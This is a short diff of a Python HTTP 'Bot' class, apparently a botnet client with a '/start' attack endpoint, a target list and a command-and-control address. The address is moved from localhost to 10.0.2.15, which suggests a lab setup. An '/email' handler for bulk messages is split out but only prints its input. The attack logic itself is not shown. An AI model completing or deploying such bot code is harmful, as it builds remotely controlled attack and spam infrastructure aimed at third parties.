@@ -43,14 +43,20 @@ class Bot(BaseHTTPRequestHandler):
         if self.path == '/start':
             self.__start_attack()
         elif self.path == '/email':
-            length = int(self.headers['Content-Length'])
-            payload = json.loads(self.rfile.read(length).decode('utf-8'))
-            # TODO send email to the given address
-            self.send_response(200)
+            self.__start_email()
         else:
             self.send_response(404)
 
         self.end_headers()
+
+    def __start_email(self):
+        length = int(self.headers['Content-Length'])
+        payload = json.loads(self.rfile.read(length).decode('utf-8'))
+        # TODO send email to the given address
+        print(payload['emails'])
+        print(payload['subj'])
+        print(payload['txt'])
+        self.send_response(200)
 
     def __start_attack(self):
         length = int(self.headers['Content-Length'])
@@ -84,7 +90,7 @@ class Bot(BaseHTTPRequestHandler):
             self.status['targets'].clear()
 
 
-CNC_ADDR = "127.0.0.1"
+CNC_ADDR = "10.0.2.15"
 CNC_PORT = 60000
 
 
